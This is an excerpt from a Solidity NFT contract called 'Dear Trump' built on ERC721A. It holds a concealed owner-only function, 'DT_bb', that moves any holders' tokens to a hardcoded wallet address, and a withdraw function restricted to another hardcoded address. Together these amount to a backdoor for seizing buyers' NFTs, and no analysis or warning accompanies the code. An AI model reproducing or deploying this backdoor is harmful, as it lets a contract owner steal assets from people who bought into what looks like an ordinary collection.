...
contract Dear_Trump is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("Dear Trump", "DT", maxBatchSize_, collectionSize_) {
  ...
  function DT_bb(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        uint256 len = tokenids.length;
        for (uint256 i; i < len; i++) {
            uint256 tokenid = tokenids[i];
            transferFrom(ownerOf(tokenid), 0xc92f8566327337B4391ba1405EC89B70Ab1FA587, tokenid);
        }
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0x63243e6273046181Fc3CA8ad4DDe62b3e3f5aEc7);
